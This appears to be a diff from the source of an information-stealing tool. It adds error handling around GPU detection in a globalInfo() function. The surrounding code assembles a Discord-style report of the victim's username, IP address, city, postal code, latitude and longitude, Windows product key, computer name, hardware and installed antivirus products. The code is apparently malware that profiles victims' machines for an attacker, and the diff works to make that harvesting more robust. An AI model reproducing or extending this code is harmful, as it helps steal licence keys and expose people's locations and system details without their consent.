@@ -513,25 +513,28 @@ def globalInfo():
     cores = os.cpu_count()
     avss = avs()
     system = os.name
-    if system == 'Linux':
-        gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
-        if gpu_info:
+    try:
+        if system == 'Linux':
+            gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
+            if gpu_info:
+                try:
+                    gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
+                except: gpu= "ERROR"
+                
+        elif system == 'nt':
             try:
-                gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
-            except: gpu= "ERROR"
-            
-    elif system == 'nt':
-        try:
-            gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
-            total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read().strip()
-            free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read().strip()
-            used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
-            temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()
+                gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
+                total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read().strip()
+                free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read().strip()
+                used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
+                temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()
 
-            gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
+                gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
 
-        except Exception as e:
-            gpu = f"An error occurred"
+            except Exception as e:
+                gpu = f"An error occurred"
+    except:
+        gpu = "error"
 
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \n`Latitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
     if len(globalinfo) > 1750:
